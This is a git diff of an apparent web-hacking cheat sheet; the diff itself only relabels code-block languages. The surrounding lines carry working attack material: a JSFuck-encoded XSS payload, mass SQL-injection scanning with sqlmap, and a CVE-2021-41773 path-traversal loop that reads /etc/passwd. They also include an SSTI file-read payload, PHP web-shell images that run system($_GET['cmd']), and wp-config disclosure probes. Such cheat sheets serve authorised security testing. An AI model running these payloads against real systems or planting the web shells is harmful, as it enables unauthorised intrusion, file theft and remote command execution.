@@ -49,7 +49,7 @@
 
 ### Installation
 
-```c
+```console
 $ go install -v github.com/hakluke/haktrails@latest
 $ go install -v github.com/tomnomnom/anew@latest
 $ go install -v github.com/projectdiscovery/notify/cmd/notify@latest
@@ -59,22 +59,22 @@ $ go install -v github.com/projectdiscovery/notify/cmd/notify@latest
 
 #### haktrails
 
-```c
+```console
 $ vi ~/.config/haktools/haktrails-config.yml
 ```
 
-```c
+```console
 securitytrails:
   key: <API_KEY>
 ```
 
 #### Notify
 
-```c
+```console
 $ vi ~/.config/notify/provider-config.yaml
 ```
 
-```c
+```console
 slack:
   - id: "slack"
     slack_channel: "recon"
@@ -171,7 +171,7 @@ custom:
 
 ### Monitoring Oneliner
 
-```c
+```console
 $ while :; do echo <DOMAIN> | haktrails subdomain | anew subdomains.txt; sleep 86400; done | notify
 ```
 
@@ -193,7 +193,7 @@ $ while :; do echo <DOMAIN> | haktrails subdomain | anew subdomains.txt; sleep 8
 
 > https://github.com/aemkei/jsfuck/blob/master/jsfuck.js
 
-```c
+```javascript
 ![]                                          // false
 !![]                                         // true
 [][[]]                                       // undefined
@@ -212,55 +212,55 @@ $ while :; do echo <DOMAIN> | haktrails subdomain | anew subdomains.txt; sleep 8
 
 #### Encoded Payload
 
-```c
+```javascript
 <img src onerror="(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[]) [+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]++[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]]">
 ```
 
 ## Enumerate Subdomains, Web Servers and API Endpoints
 
-```c
+```console
 $ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d); ffuf -u $i/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-endpoints.txt -o ${DOMAIN}_ffuf.txt; done
 ```
 
 ## Find CNAME Records
 
-```c
+```console
 $ for ip in $(cat <FILE>.txt); do dig asxf %ip | grep CNAME; done
 ```
 
 ## Find hidden Parameters in JavaScript Files
 
-```c
+```console
 $ assetfinder <DOMAIN> | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
 ```
 
 ## Find JavaScript Files with gau and httpx
 
-```c
+```console
 $ echo http://<DOMAIN> | gau | grep '\.js$' | httpx -status-code -mc 200 -content-type | grep 'application/javascript'
 ```
 
 ## Find Open Redirects
 
-```c
+```console
 $ echo "http://<RHOST>" | gau | grep =http | php -r "echo urldecode(file_get_contents('php://stdin'));"
 ```
 
 ## Find Secrets in JavaScript Files
 
-```c
+```console
 $ subfinder -d <DOMAIN> -silent | /home/<USERNAME>/go/bin/httpx -silent -o <DOMAIN>_httpx.txt; for i in $(cat <DOMAIN>_httpx.txt); do DOMAIN=$(echo $i | /home/<USERNAME>/go/bin/unfurl format %d) | cat <DOMAIN>_httpx.txt | nuclei -t /home/<USERNAME>/opt/03_web_application_analysis/nuclei-templates/exposures/tokens -o token-expose.txt; done
 ```
 
 ## Find Subdomains based on Certificates
 
-```c
+```console
 $ curl -s https://crt.sh/\?q\=<DOMAIN>\&output\=json | jq . | grep 'name_value' | awk '{print $2}' | sed -e 's/"//g'| sed -e 's/,//g' | awk '{gsub(/\\n/,"\n")}1' | sort -u
 ```
 
 ## Find SQL-Injection (SQLi) at Scale
 
-```c
+```console
 $ subfinder -d <DOMAIN> -silent -all | httpx -silent -threads 100 | katana -d 4 -jc -ef css,png,svg,ico,woff,gif | tee -a <FILE>
 $ cat <FILE> | gf sqli | tee -a <FILE>
 $ while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3; done < <FILE>
@@ -268,7 +268,7 @@ $ while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logi
 
 ## Find basic SQL-Injection (SQLi), Cross-Site Scripting (XSS) and Server-Side Template Injection (SSTI) Vulnerabilities with Magic Payload
 
-```c
+```console
 '"><svg/onload=alert()>{{7*7}}
 ```
 
@@ -282,18 +282,18 @@ $ while read line; do sqlmap -u $line --parse-errors --current-db --invalid-logi
 
 > https://github.com/projectdiscovery/katana
 
-```c
+```console
 $ echo <DOMAIN> | gau | while read url; do python3 xsstrike.py -u $url --crawl -l 4 -d 5; done
 $ echo <DOMAIN> | katana | while read url; do python3 xsstrike.py -u $url --crawl -l 4; done
 ```
 
-```c
+```console
 $ subfinder -d <DOMAIN> -all -silent | httpx -silent | katana -silent | Gxss -c 100 | dalfox pipe --skip-bav --skip-mining-all --skip-grepping
 ```
 
 ## Fingerprinting with Shodan and Nuclei
 
-```c
+```console
 $ shodan domain <DOMAIN> | awk '{print $3}' | httpx -silent | nuclei -t /PATH/TO/TEMPLATES/nuclei-templates/
 ```
 
@@ -342,13 +342,13 @@ X-Forwarded-Host:IP
 
 ## Path Traversal Zero-Day in Apache HTTP Server (CVE-2021-41773)
 
-```c
+```console
 $ cat <FILE>.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n" || echo "$host \033[0;32mNot Vulnerable\n";done
 ```
 
 ## Server-Side Template Injection (SSTI) at Scale
 
-```c
+```console
 $ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/hostname').read()}}" | parallel -j50 -q curl -g | grep  "root:x"
 ```
 
@@ -365,20 +365,20 @@ $ echo "<DOMAIN>" | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.
 
 > https://github.com/tomnomnom/waybackurls
 
-```c
+```console
 $ waybackurls <DOMAIN> | grep - -color -E "1.xls | \\.tar.gz | \\.bak | \\.xml | \\.xlsx | \\.json | \\.rar | \\.pdf | \\.sql | \\.doc | \\.docx | \\.pptx | \\.txt | \\.zip | \\.tgz | \\.7z"
 ```
 
 ## Web Shell / Malicious Images
 
-```c
+```console
 $ echo -n -e '\xFF\xD8\xFF\xE0<?php system($_GET["cmd"]);?>.' > <FILE>.jpg
 $ echo -n -e '\x89\x50\x4E\x47<?php system($_GET["cmd"]);?>.' > <FILE>.png
 ```
 
 ## Wordpress Configuration Disclosure
 
-```c
+```console
 $ subfinder -silent -d http://<DOMAIN> | httpx -silent -nc -p 80,443,8080,8443,9000,9001,9002,9003,8088 -path "/wp-config.PHP" -mc 200 -t 60
 ```
 
@@ -388,7 +388,7 @@ $ subfinder -silent -d http://<DOMAIN> | httpx -silent -nc -p 80,443,8080,8443,9
 
 Note that `HTML tags` that need to be closed for `XSS`.
 
-```c
+```console
 <!--
 <title>
 <textarea>
@@ -399,12 +399,12 @@ Note that `HTML tags` that need to be closed for `XSS`.
 <noembed>
 ```
 
-```c
+```console
 --></title></textarea></style></noscript></script></xmp></template></noembed><svg/onload=alert()>
 ```
 
 ### Single Domain One-liner
 
-```c
+```console
 $ echo https://<DOMAIN>/ | gau | gf xss | uro | Gxss | kxss | tee <FILE>.txt
 ```
